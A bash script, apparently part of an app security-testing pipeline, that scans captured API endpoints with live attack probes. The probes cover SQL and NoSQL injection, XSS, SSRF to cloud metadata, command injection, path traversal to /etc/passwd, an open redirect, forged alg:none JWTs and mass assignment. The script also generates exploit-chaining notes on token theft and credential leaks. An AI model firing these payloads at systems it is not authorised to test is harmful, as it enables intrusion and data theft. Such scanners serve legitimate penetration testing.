#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 18_dastforge.sh - Context-aware DAST (smart by default) + vulnerability chaining.
#   Smart mode: classifies each param, skips static/non-injectable targets, runs a cheap
#   pre-probe per class, and only escalates the full battery on a real signal; a finding is
#   flagged only on 2 independent signals (differential confirmation) — no blind fuzzing.
#   Use --deep for brute-force fallback (all classes on all params).
PROFILE_PHASE="18_dastforge"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"

PKG="$(tget apk package_name)"
[ -z "$PKG" ] && { err "No package_name"; exit 1; }

DEEP=0
[ "${1:-}" = "--deep" ] && DEEP=1

cd "$RUN_DIR" || exit 1
CH_DIR="$RUN_DIR/vuln_chaining"
mkdir -p "$CH_DIR/results"

# ---- Proxy (Burp) ----
PROXY=""
PHOST="$(tget proxy host)"; PPORT="$(tget proxy port)"
[ -n "$PHOST" ] && [ -n "$PPORT" ] && PROXY="http://$PHOST:$PPORT"
CURL_BASE=(-s --max-time 15)
[ -n "$PROXY" ] && CURL_BASE+=(-x "$PROXY")

# ============================================================
# A. Discover target endpoints (filtered: no static assets)
# ============================================================
info "=== A. Discovering target endpoints ==="
EP="$CH_DIR/target_endpoints.txt"
: > "$EP"
for src in traffic/api_endpoints.txt static/urls.txt code_analysis/cleartext_urls.txt; do
  [ -f "$RUN_DIR/$src" ] && { grep -oE 'https?://[a-zA-Z0-9./_?=&%:-]+' "$RUN_DIR/$src" >> "$EP" || true; }
done

is_static() { # 1 if URL is a static asset / clearly non-testable
  echo "$1" | grep -qiE '\.(js|css|png|jpe?g|gif|svg|webp|ico|woff2?|ttf|eot|map|zip|apk)([?#]|$)' && return 0
  echo "$1" | grep -qiE '/(assets|static|img|images|css|js|fonts|favicon|sitemap|robots)[/.?]' && return 0
  return 1
}

sort -u "$EP" -o "$EP"
: > "$EP.tmp"
while IFS= read -r ep; do
  if is_static "$ep"; then
    echo "SKIP static: $ep" >> "$CH_DIR/skipped_static.txt"
  else
    echo "$ep" >> "$EP.tmp"
  fi
done < "$EP"
mv "$EP.tmp" "$EP"
EP_COUNT=$(wc -l < "$EP" 2>/dev/null || echo 0)
info "  Testable endpoints: $EP_COUNT (static/non-testable filtered out)"
[ "$EP_COUNT" -eq 0 ] && { warn "No testable endpoints — run 06_traffic_capture first"; exit 0; }

if [ -n "$PROXY" ]; then
  if ! curl "${CURL_BASE[@]}" -o /dev/null -w '%{http_code}' "$(head -1 "$EP")" 2>/dev/null | grep -qE '2|3|4'; then
    warn "Burp proxy unreachable — testing directly"
    CURL_BASE=(-s --max-time 15)
  else
    ok "Testing through Burp proxy $PROXY"
  fi
fi

# ============================================================
# Helpers
# ============================================================
send_req() {
  local method="$1" url="$2" data="$3"
  local args=("${CURL_BASE[@]}" -o "$CH_DIR/results/body.tmp" -w '%{http_code}')
  case "$method" in
    POST)   args+=(-X POST   -H "Content-Type: application/json") ;;
    PUT)    args+=(-X PUT    -H "Content-Type: application/json") ;;
    DELETE) args+=(-X DELETE) ;;
    PATCH)  args+=(-X PATCH  -H "Content-Type: application/json") ;;
  esac
  [ -n "$data" ] && args+=(-d "$data")
  REQ_CODE=$(curl "${args[@]}" "$url" 2>/dev/null)
  REQ_BODY=""
  [ -f "$CH_DIR/results/body.tmp" ] && REQ_BODY=$(cat "$CH_DIR/results/body.tmp")
}

has_param() { case "$1" in *'?'*) return 0;; *) return 1;; esac; }
param_pairs() { echo "${1#*\?}" | tr '&' '\n'; }
uri_enc() { printf '%s' "$1" | jq -sRr @uri 2>/dev/null || echo "$1"; }

# ---- Context-aware param classifier: only relevant vuln classes per param ----
classify_param() {
  local p="$1"
  pname="${p%%=*}"
  [ "$DEEP" -eq 1 ] && { echo "sqli,xss,ssrf,cmdi,idor,ssti,lfi,nosqli,openredirect,jwt"; return; }
  case "$pname" in
    *url*|*redirect*|*next*|*return*|*back*|*continue*|*callback*|*link*|*webhook*|*fetch*|*src*|*dest*|*uri*|*target*|*domain*|*host*) echo "ssrf,openredirect" ;;
    *token*|*jwt*|*session*|*auth*|*api_key*|*apikey*|*key*|*secret*) echo "jwt" ;;
    *file*|*dir*|*filename*|*path*|*download*|*upload*) echo "lfi" ;;
    *id*|*num*|*count*|*limit*|*offset*|*page*) echo "idor,sqli" ;;
    *template*|*render*|*format*|*message*|*text*|*title*|*comment*|*content*|*body*) echo "ssti,sqli,xss" ;;
    *q*|*search*|*filter*|*sort*|*order*|*query*|*user*|*email*|*phone*|*address*|*name*) echo "sqli,xss,nosqli" ;;
    *) echo "sqli,xss,nosqli" ;;
  esac
}

# ============================================================
# B. SQL injection — smart (pre-probe then full battery, 2-signal)
# ============================================================
info "=== B. SQL injection (context-aware) ==="
SQLI_DIR="$CH_DIR/results/sqli"; mkdir -p "$SQLI_DIR"
: > "$CH_DIR/sqli_findings.txt"
SQL_ERRORS='(SQL syntax|mysql|PostgreSQL|ORA-[0-9]{5}|SQLite|sqlite|MSSQL|SqlServer|syntax error|unclosed quotation|ODBC|You have an error)'
SQLI_FULL=(
  "'"
  "' OR '1'='1"
  "' AND '1'='2"
  "' OR SLEEP(3)-- -"
  "1' OR 1=1-- -"
  "' UNION SELECT NULL,NULL,NULL-- -"
  "1' OR pg_sleep(3)-- -"
  "' WAITFOR DELAY '0:0:3'-- -"
)

sqli_test() {
  local url="$1" p="$2"
  pname="${p%%=*}"
  local base="${url%%\?*}"
  local bv="${p#*=}"; [ -z "$bv" ] && bv="1"
  local esc=$(uri_enc "$bv")

  # PRE-PROBE: boolean pair + error trigger (cheap, 3 requests)
  local u1="$base?${pname}=${esc}$(uri_enc "' AND '1'='1")"
  local u2="$base?${pname}=${esc}$(uri_enc "' AND '1'='2")"
  send_req GET "$u1" ""; len1=${#REQ_BODY}; body1="$REQ_BODY"
  send_req GET "$u2" ""; len2=${#REQ_BODY}
  local signal=0
  echo "$body1" | grep -qiE "$SQL_ERRORS" && signal=1
  if [ $((len1 - len2)) -gt 5 ] || [ $((len2 - len1)) -gt 5 ]; then signal=1; fi

  if [ "$signal" -eq 0 ]; then
    [ "$DEEP" -eq 1 ] || { return 1; }   # no signal -> clean, no blind battery
  fi

  # FULL battery only on signal (or --deep)
  for payload in "${SQLI_FULL[@]}"; do
    local tu="$base?${pname}=${esc}$(uri_enc "$payload")"
    send_req GET "$tu" ""
    if echo "$REQ_BODY" | grep -qiE "$SQL_ERRORS"; then
      # 2nd signal = battery error (pre-probe already signaled): confirmed
      echo "CONFIRMED error-based $url param=$pname payload=$payload" >> "$SQLI_DIR/$pname.txt"
      echo "$tu|SQLI|$pname|$payload|error-based" >> "$CH_DIR/sqli_findings.txt"
      return 0
    fi
    local t0=$(date +%s%N); send_req GET "$tu" ""; t1=$(date +%s%N)
    local ms=$(( (t1 - t0) / 1000000 ))
    if [ "$ms" -gt 2500 ]; then
      echo "CONFIRMED time-based ${ms}ms $url param=$pname payload=$payload" >> "$SQLI_DIR/$pname.txt"
      echo "$tu|SQLI-TIME|$pname|$payload|${ms}ms" >> "$CH_DIR/sqli_findings.txt"
      return 0
    fi
  done
  return 1
}

while IFS= read -r ep; do
  has_param "$ep" || continue
  while IFS= read -r p; do
    [ "$(classify_param "$p")" = "jwt" ] && continue
    case "$(classify_param "$p")" in
      *sqli*) sqli_test "$ep" "$p" ;;
    esac
  done < <(param_pairs "$ep")
done < "$EP"

SQLI_N=$(wc -l < "$CH_DIR/sqli_findings.txt" 2>/dev/null || echo 0)
if [ "$SQLI_N" -gt 0 ]; then
  warn "  SQLi confirmed/suspected: $SQLI_N"
  fadd "SQL injection on API parameter (2-signal confirmed)" HIGH PROBABLE CWE-89 A03:2021 \
    --cvss 8.1 --component "API" --tags "sqli,api,chaining-primitive" \
    --remediation "Parameterized queries / prepared statements; WAF; input validation" "$CH_DIR/sqli_findings.txt"
else
  ok "  No SQLi — params with no signal were not blindly fuzzed"
fi

# ============================================================
# C. Reflected XSS — only text-bearing params (reflection = test)
# ============================================================
info "=== C. Reflected XSS (text params only) ==="
XSS_DIR="$CH_DIR/results/xss"; mkdir -p "$XSS_DIR"
: > "$CH_DIR/xss_findings.txt"
XSS_PROBE="zzxssz<script>alert(1)</script>"

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}"
    case "$(classify_param "$p")" in *xss*) ;; *) continue;; esac
    send_req GET "$clean?${pname}=$(uri_enc "$XSS_PROBE")" ""
    if echo "$REQ_BODY" | grep -q "zzxssz<script>alert(1)</script>"; then
      echo "CONFIRMED reflected $ep param=$pname" >> "$XSS_DIR/$pname.txt"
      echo "$ep|XSS|$pname|reflected" >> "$CH_DIR/xss_findings.txt"
    fi
  done < <(param_pairs "$ep")
done < "$EP"

XSS_N=$(wc -l < "$CH_DIR/xss_findings.txt" 2>/dev/null || echo 0)
[ "$XSS_N" -gt 0 ] && { warn "  Reflected XSS confirmed: $XSS_N"; fadd "Reflected XSS on API parameter" MEDIUM PROBABLE CWE-79 A03:2021 --cvss 6.1 --component "API" --tags "xss,chaining-primitive" --remediation "Output-encode responses; CSP; context-aware escaping" "$CH_DIR/xss_findings.txt"; } || ok "  No reflected XSS (text params only)"

# ============================================================
# D. SSRF — only url/fetch-style params (3 probes = the test)
# ============================================================
info "=== D. SSRF (url-style params only) ==="
SSRF_DIR="$CH_DIR/results/ssrf"; mkdir -p "$SSRF_DIR"
: > "$CH_DIR/ssrf_findings.txt"
SSRF_PROBES=("http://127.0.0.1" "http://169.254.169.254/latest/meta-data/" "http://localhost")

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}"
    case "$(classify_param "$p")" in *ssrf*) ;; *) continue;; esac
    for probe in "${SSRF_PROBES[@]}"; do
      send_req GET "$clean?${pname}=$(uri_enc "$probe")" ""
      if echo "$REQ_BODY" | grep -qiE "169\.254\.169\.254|127\.0\.0\.1|root|security-credentials|ami-id"; then
        echo "SSRF-CANDIDATE $ep param=$pname probe=$probe" >> "$SSRF_DIR/$pname.txt"
        echo "$ep|SSRF|$pname|$probe" >> "$CH_DIR/ssrf_findings.txt"
      fi
    done
  done < <(param_pairs "$ep")
done < "$EP"

SSRF_N=$(wc -l < "$CH_DIR/ssrf_findings.txt" 2>/dev/null || echo 0)
[ "$SSRF_N" -gt 0 ] && { warn "  SSRF candidates: $SSRF_N"; fadd "SSRF via URL-style parameter" HIGH SUSPECTED CWE-918 A10:2021 --cvss 8.6 --component "API" --tags "ssrf,chaining-primitive" --remediation "Validate/allowlist destination hosts; block metadata IPs" "$CH_DIR/ssrf_findings.txt"; } || ok "  No SSRF (url-style params only)"

# ============================================================
# E. Command injection — time pre-probe before full set
# ============================================================
info "=== E. Command injection (time pre-probe) ==="
CMDI_DIR="$CH_DIR/results/cmdi"; mkdir -p "$CMDI_DIR"
: > "$CH_DIR/cmdi_findings.txt"
CMDI_FULL=(";sleep 3" "|sleep 3" "\$(sleep 3)" "\`sleep 3\`")

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}" bv="${p#*=}"; [ -z "$bv" ] && bv="1"
    case "$(classify_param "$p")" in *cmdi*) ;; *) continue;; esac
  esc=$(uri_enc "$bv")
    # pre-probe: one time-based
  t0=$(date +%s%N); send_req GET "$clean?${pname}=${esc}$(uri_enc ";sleep 3")" ""; t1=$(date +%s%N)
    [ $(( (t1 - t0) / 1000000 )) -gt 2500 ] || { [ "$DEEP" -eq 1 ] && : || continue; }
    for payload in "${CMDI_FULL[@]}"; do
  t2=$(date +%s%N); send_req GET "$clean?${pname}=${esc}$(uri_enc "$payload")" ""; t3=$(date +%s%N)
  ms=$(( (t3 - t2) / 1000000 ))
      if [ "$ms" -gt 2500 ]; then
        echo "CMDI-CANDIDATE $ep param=$pname payload=$payload (${ms}ms)" >> "$CMDI_DIR/$pname.txt"
        echo "$ep|CMDI|$pname|$payload" >> "$CH_DIR/cmdi_findings.txt"
      fi
    done
  done < <(param_pairs "$ep")
done < "$EP"

CMDI_N=$(wc -l < "$CH_DIR/cmdi_findings.txt" 2>/dev/null || echo 0)
[ "$CMDI_N" -gt 0 ] && { warn "  Command injection candidates: $CMDI_N"; fadd "Command injection (time-based)" CRITICAL SUSPECTED CWE-78 A03:2021 --cvss 9.8 --component "API" --tags "cmdi,chaining-primitive" --remediation "Never pipe user input to a shell" "$CH_DIR/cmdi_findings.txt"; } || ok "  No command injection (time pre-probe only)"

# ============================================================
# F. IDOR / BOLA — numeric ID params only
# ============================================================
info "=== F. IDOR / BOLA (numeric IDs only) ==="
IDOR_DIR="$CH_DIR/results/idor"; mkdir -p "$IDOR_DIR"
: > "$CH_DIR/idor_findings.txt"

while IFS= read -r ep; do
  base="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}" val="${p#*=}"
    case "$(classify_param "$p")" in *idor*) ;; *) continue;; esac
    [[ "$val" =~ ^[0-9]+$ ]] || continue
  next=$((val + 1))
    send_req GET "$ep" ""; bl=${#REQ_BODY}
    send_req GET "$base?${pname}=$next" ""; al=${#REQ_BODY}
    if [ "$al" -gt 0 ] && [ $((al - bl)) -gt 20 ]; then
      echo "IDOR-CANDIDATE $ep -> $base?${pname}=$next (len $bl->$al)" >> "$IDOR_DIR/$pname.txt"
      echo "$ep|IDOR|$pname|$next" >> "$CH_DIR/idor_findings.txt"
    fi
  done < <(param_pairs "$ep")
done < "$EP"

IDOR_N=$(wc -l < "$CH_DIR/idor_findings.txt" 2>/dev/null || echo 0)
[ "$IDOR_N" -gt 0 ] && { warn "  IDOR candidates: $IDOR_N"; fadd "IDOR/BOLA — object ID enumeration" HIGH SUSPECTED CWE-639 A01:2021 --cvss 7.5 --component "API" --tags "idor,chaining-primitive" --remediation "Server-side object-level authorization per request; avoid sequential IDs" "$CH_DIR/idor_findings.txt"; } || ok "  No IDOR (numeric IDs only)"

# ============================================================
# H. SSTI (server-side template injection) — text/template params
# ============================================================
info "=== H. SSTI (text/template params) ==="
SSTI_DIR="$CH_DIR/results/ssti"; mkdir -p "$SSTI_DIR"
: > "$CH_DIR/ssti_findings.txt"
SSTI_PROBES=("{{7*7}}" '${7*7}' '#{7*7}')

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}"
    case "$(classify_param "$p")" in *ssti*) ;; *) continue;; esac
    for pl in "${SSTI_PROBES[@]}"; do
      send_req GET "$clean?${pname}=$(uri_enc "$pl")" ""
      if echo "$REQ_BODY" | grep -qE '49|7777777'; then
        echo "SSTI-CANDIDATE $ep param=$pname payload=$pl" >> "$SSTI_DIR/$pname.txt"
        echo "$ep|SSTI|$pname|$pl" >> "$CH_DIR/ssti_findings.txt"
      fi
    done
  done < <(param_pairs "$ep")
done < "$EP"
SSTI_N=$(wc -l < "$CH_DIR/ssti_findings.txt" 2>/dev/null || echo 0)
[ "$SSTI_N" -gt 0 ] && { warn "  SSTI candidates: $SSTI_N"; fadd "Server-Side Template Injection" HIGH SUSPECTED CWE-1336 A03:2021 --cvss 8.1 --component "API" --tags "ssti,chaining-primitive" --remediation "Never pass user input into template engines; use sandboxed/parameterized rendering" "$CH_DIR/ssti_findings.txt"; } || ok "  No SSTI (text/template params only)"

# ============================================================
# I. LFI / Path traversal — file/path params
# ============================================================
info "=== I. LFI / Path traversal (file/path params) ==="
LFI_DIR="$CH_DIR/results/lfi"; mkdir -p "$LFI_DIR"
: > "$CH_DIR/lfi_findings.txt"
LFI_PAYLOADS=("../../../../etc/passwd" "..%2f..%2f..%2f..%2fetc/passwd" "....//....//etc/passwd")

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}"
    case "$(classify_param "$p")" in *lfi*) ;; *) continue;; esac
    for pl in "${LFI_PAYLOADS[@]}"; do
      send_req GET "$clean?${pname}=$(uri_enc "$pl")" ""
      if echo "$REQ_BODY" | grep -qE 'root:.*:0:0:|/bin/(ba)?sh|/etc/passwd'; then
        echo "LFI-CANDIDATE $ep param=$pname payload=$pl" >> "$LFI_DIR/$pname.txt"
        echo "$ep|LFI|$pname|$pl" >> "$CH_DIR/lfi_findings.txt"
      fi
    done
  done < <(param_pairs "$ep")
done < "$EP"
LFI_N=$(wc -l < "$CH_DIR/lfi_findings.txt" 2>/dev/null || echo 0)
[ "$LFI_N" -gt 0 ] && { warn "  LFI candidates: $LFI_N"; fadd "Local File Inclusion / Path Traversal" HIGH SUSPECTED CWE-22 A01:2021 --cvss 7.5 --component "API" --tags "lfi,chaining-primitive" --remediation "Normalize + validate file paths; allowlist; never join user input into paths" "$CH_DIR/lfi_findings.txt"; } || ok "  No LFI (file/path params only)"

# ============================================================
# J. Open Redirect — url/redirect/next params
# ============================================================
info "=== J. Open Redirect (redirect-style params) ==="
OREDIR_DIR="$CH_DIR/results/open_redirect"; mkdir -p "$OREDIR_DIR"
: > "$CH_DIR/open_redirect_findings.txt"
OREDIR_TARGET="https://evil.example.com/"
send_req_hdr() { # like send_req but also captures headers into REQ_HEADERS
  local method="$1" url="$2" data="$3"
  local args=("${CURL_BASE[@]}" -o "$CH_DIR/results/body.tmp" -D "$CH_DIR/results/headers.tmp" -w '%{http_code}')
  case "$method" in POST) args+=(-X POST -H "Content-Type: application/json");; esac
  [ -n "$data" ] && args+=(-d "$data")
  REQ_CODE=$(curl "${args[@]}" "$url" 2>/dev/null)
  REQ_BODY=""; [ -f "$CH_DIR/results/body.tmp" ] && REQ_BODY=$(cat "$CH_DIR/results/body.tmp")
  REQ_HEADERS=""; [ -f "$CH_DIR/results/headers.tmp" ] && REQ_HEADERS=$(cat "$CH_DIR/results/headers.tmp")
}

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}"
    case "$(classify_param "$p")" in *openredirect*) ;; *) continue;; esac
    send_req_hdr GET "$clean?${pname}=$(uri_enc "$OREDIR_TARGET")" ""
    if echo "$REQ_CODE" | grep -qE '^30[0-9]$' && echo "$REQ_HEADERS" | grep -qi "Location:.*evil.example.com"; then
      echo "OPEN-REDIRECT confirmed $ep param=$pname" >> "$OREDIR_DIR/$pname.txt"
      echo "$ep|OPEN-REDIRECT|$pname|$OREDIR_TARGET|$REQ_CODE" >> "$CH_DIR/open_redirect_findings.txt"
    fi
  done < <(param_pairs "$ep")
done < "$EP"
OREDIR_N=$(wc -l < "$CH_DIR/open_redirect_findings.txt" 2>/dev/null || echo 0)
[ "$OREDIR_N" -gt 0 ] && { warn "  Open redirect confirmed: $OREDIR_N"; fadd "Open Redirect on redirect-style parameter" MEDIUM SUSPECTED CWE-601 A01:2021 --cvss 4.7 --component "API" --tags "open-redirect,chaining-primitive" --remediation "Validate redirect target against an allowlist of trusted hosts" "$CH_DIR/open_redirect_findings.txt"; } || ok "  No open redirect (redirect-style params only)"

# ============================================================
# K. NoSQLi — MongoDB operator injection on text params
# ============================================================
info "=== K. NoSQLi (operator injection) ==="
NOSQLI_DIR="$CH_DIR/results/nosqli"; mkdir -p "$NOSQLI_DIR"
: > "$CH_DIR/nosqli_findings.txt"

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}" bv="${p#*=}"; [ -z "$bv" ] && bv="1"
    case "$(classify_param "$p")" in *nosqli*) ;; *) continue;; esac
    # boolean pair: normal vs $ne operator
    send_req GET "$clean?${pname}=$(uri_enc "$bv")" ""; base_len=${#REQ_BODY}
    send_req GET "$clean?${pname}[$(uri_enc '$ne')]=$(uri_enc 'nonexistent_value_zz')" ""; ne_len=${#REQ_BODY}
    if [ $((base_len - ne_len)) -gt 5 ] || [ $((ne_len - base_len)) -gt 5 ]; then
      echo "NOSQLI-CANDIDATE $ep param=$pname (len $base_len->$ne_len)" >> "$NOSQLI_DIR/$pname.txt"
      echo "$ep|NOSQLI|$pname|\$ne|len-diff" >> "$CH_DIR/nosqli_findings.txt"
    fi
  done < <(param_pairs "$ep")
done < "$EP"
NOSQLI_N=$(wc -l < "$CH_DIR/nosqli_findings.txt" 2>/dev/null || echo 0)
[ "$NOSQLI_N" -gt 0 ] && { warn "  NoSQLi candidates: $NOSQLI_N"; fadd "NoSQL injection (\$ne operator)" HIGH SUSPECTED CWE-943 A03:2021 --cvss 8.1 --component "API" --tags "nosqli,chaining-primitive" --remediation "Use typed bindings / parameterised queries for NoSQL; reject operator keys" "$CH_DIR/nosqli_findings.txt"; } || ok "  No NoSQLi"

# ============================================================
# L. JWT tampering (alg:none) — token params
# ============================================================
info "=== L. JWT tampering (alg:none) — token params ==="
JWT_DIR="$CH_DIR/results/jwt"; mkdir -p "$JWT_DIR"
: > "$CH_DIR/jwt_findings.txt"
b64url() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  while IFS= read -r p; do
  pname="${p%%=*}"
    case "$(classify_param "$p")" in *jwt*) ;; *) continue;; esac
  h=$(b64url '{"alg":"none","typ":"JWT"}')
  pay=$(b64url '{"sub":"admin","role":"admin","admin":true}')
  forged="$h.$pay."
    send_req GET "$clean?${pname}=$forged" ""
    if echo "$REQ_CODE" | grep -qE '^2[0-9][0-9]$'; then
      echo "JWT-ALGNONE accepted $ep param=$pname (HTTP $REQ_CODE)" >> "$JWT_DIR/$pname.txt"
      echo "$ep|JWT-ALG-NONE|$pname|$forged|$REQ_CODE" >> "$CH_DIR/jwt_findings.txt"
    fi
  done < <(param_pairs "$ep")
done < "$EP"
JWT_N=$(wc -l < "$CH_DIR/jwt_findings.txt" 2>/dev/null || echo 0)
[ "$JWT_N" -gt 0 ] && { warn "  JWT alg:none accepted: $JWT_N"; fadd "JWT alg:none / signature bypass accepted" CRITICAL SUSPECTED CWE-345 A07:2021 --cvss 9.1 --component "API" --tags "jwt,chaining-primitive" --remediation "Reject alg:none; pin algorithm; verify signature with strong key" "$CH_DIR/jwt_findings.txt"; } || ok "  No JWT alg:none acceptance"

# ============================================================
# M. Mass assignment (privilege field injection on write endpoints)
# ============================================================
info "=== M. Mass assignment (privilege injection) ==="
MASS_DIR="$CH_DIR/results/mass_assignment"; mkdir -p "$MASS_DIR"
: > "$CH_DIR/mass_assignment_findings.txt"

while IFS= read -r ep; do
  has_param "$ep" || continue
  clean="${ep%%\?*}"
  send_req POST "$clean" '{"role":"admin","isAdmin":true,"permissions":["*"]}'
  code_post="$REQ_CODE" body_post="$REQ_BODY"
  send_req POST "$clean" '{}'
  body_base="$REQ_BODY"
  if [ "$code_post" != "500" ] && [ "$code_post" != "404" ]; then
    if echo "$body_post" | grep -qiE '"(role|isAdmin|permissions|admin)"\s*:' || [ "${#body_post}" != "${#body_base}" ]; then
      echo "MASS-ASSIGNMENT-CANDIDATE $ep (POST accepted injected privilege fields)" >> "$MASS_DIR/endpoint.txt"
      echo "$ep|MASS-ASSIGNMENT|POST|role/admin injected" >> "$CH_DIR/mass_assignment_findings.txt"
    fi
  fi
done < "$EP"
MASS_N=$(wc -l < "$CH_DIR/mass_assignment_findings.txt" 2>/dev/null || echo 0)
[ "$MASS_N" -gt 0 ] && { warn "  Mass assignment candidates: $MASS_N"; fadd "Mass Assignment — privilege field injection accepted" HIGH SUSPECTED CWE-915 A04:2021 --cvss 7.1 --component "API" --tags "mass-assignment,chaining-primitive" --remediation "Allowlist bindable fields; never bind role/permissions from user input" "$CH_DIR/mass_assignment_findings.txt"; } || ok "  No mass assignment signal"

# ============================================================
# G. Vulnerability chaining
# ============================================================
info "=== G. Building vulnerability chains ==="
CHAINS="$CH_DIR/chains.md"
: > "$CHAINS"
{
  echo "# Vulnerability Chains — $PKG"
  echo ""
  echo "Built from co-occurring findings. A chain escalates a low-severity primitive"
  echo "into a higher-impact exploit — confirm each hop manually before reporting."
  echo ""
  sqli=0; xss=0; ssrf=0; cmdi=0; idor=0
  [ -s "$CH_DIR/sqli_findings.txt" ] && sqli=$(wc -l < "$CH_DIR/sqli_findings.txt")
  [ -s "$CH_DIR/xss_findings.txt" ]  && xss=$(wc -l < "$CH_DIR/xss_findings.txt")
  [ -s "$CH_DIR/ssrf_findings.txt" ] && ssrf=$(wc -l < "$CH_DIR/ssrf_findings.txt")
  [ -s "$CH_DIR/cmdi_findings.txt" ] && cmdi=$(wc -l < "$CH_DIR/cmdi_findings.txt")
  [ -s "$CH_DIR/idor_findings.txt" ] && idor=$(wc -l < "$CH_DIR/idor_findings.txt")

  [ "$sqli" -gt 0 ] && [ "$idor" -gt 0 ] && {
    echo "## Chain 1: SQLi -> Auth Bypass -> IDOR (bulk data access)"
    echo "- SQLi ($sqli) on auth/login or user-lookup param bypasses login; IDOR ($idor) enumerates other users' objects. Impact: mass takeover (CRITICAL)."
    echo ""
  }
  [ "$xss" -gt 0 ] && {
    echo "## Chain 2: Reflected XSS -> Session/Token theft -> ATO"
    echo "- XSS ($xss) executes in app context; exfiltrate JWT/session and replay in Burp Repeater for ATO."
    echo ""
  }
  [ "$ssrf" -gt 0 ] && {
    echo "## Chain 3: SSRF -> Cloud Metadata -> Credentials"
    echo "- SSRF ($ssrf) reaching 169.254.169.254 leaks IAM/instance credentials."
    echo ""
  }
  [ "$cmdi" -gt 0 ] && {
    echo "## Chain 4: Command Injection -> RCE"
    echo "- CMDi ($cmdi) is a direct RCE primitive — replace sleep with a Burp Collaborator callback to confirm."
    echo ""
  }
  [ "$ssrf" -gt 0 ] && [ "$sqli" -gt 0 ] && {
    echo "## Chain 5: SSRF -> Internal SQLi"
    echo "- SSRF ($ssrf) reaches internal DB/API; SQLi ($sqli) against it bypasses the WAF boundary."
    echo ""
  }
  [ -s "$CHAINS" ] || { echo "No chains formed — findings below threshold."; echo ""; }
} >> "$CHAINS"

info "=== Summary ==="
echo "  SQLi: $SQLI_N | XSS: $XSS_N | SSRF: $SSRF_N | CMDi: $CMDI_N | IDOR: $IDOR_N"
echo "  SSTI: $SSTI_N | LFI: $LFI_N | OpenRedirect: $OREDIR_N | NoSQLi: $NOSQLI_N | JWT: $JWT_N | MassAssignment: $MASS_N"
ok "Vuln chaining report: $CHAINS"
ok "Findings recorded via fadd (see 08_findings_report)"